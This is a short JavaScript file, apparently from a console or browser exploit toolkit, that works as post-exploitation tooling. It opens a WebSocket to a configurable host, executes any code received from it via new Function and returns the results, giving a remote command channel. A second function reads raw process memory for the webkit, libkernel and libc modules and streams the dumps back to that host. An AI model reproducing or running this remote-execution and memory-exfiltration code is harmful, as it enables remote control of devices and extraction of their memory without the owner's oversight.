const hostIP = "";
const hostPort = "5000";

const secMaster = new WebSocket(`ws://${hostIP}:${hostPort}`);

secMaster.addEventListener("open", () => {
  printf("Connected to server");

  secMaster.addEventListener("message", (event) => {
    printf("Command Recieved");
    printf(event.data);
    // Execute the recieved remote code execution command
    const fn = new Function(event.data);
    let something = fn();
    secMaster.send("response:"+something);
  });
});

secMaster.addEventListener("close", () => {
  console.log("Connection closed");
});

const webkitSize = 27262976; //27mb
const libKernelSize = 300000; //300kb
const libcSize = 1200000; //1.2mb

function dumpModule(address, size, name) {
  printf(`[*] Starting to dump the ${name} module!`);

  const webSock = new WebSocket(`ws://${hostIP}:${hostPort}`);
  webSock.addEventListener("open", () => {
    let chunkSize = 2048;
    let bytesRead = 0;
    let final = false;
    while (!final) {
      if (bytesRead + chunkSize > size) {
        chunkSize = size - bytesRead;
        final = true;
      }
      let buffer = read_mem(address + bytesRead, chunkSize);
      webSock.send(`${name}.bin:${buffer}`);
      bytesRead += chunkSize;
    }
    printf(`${name} successfully dumped`);
    webSock.close();
  });
}
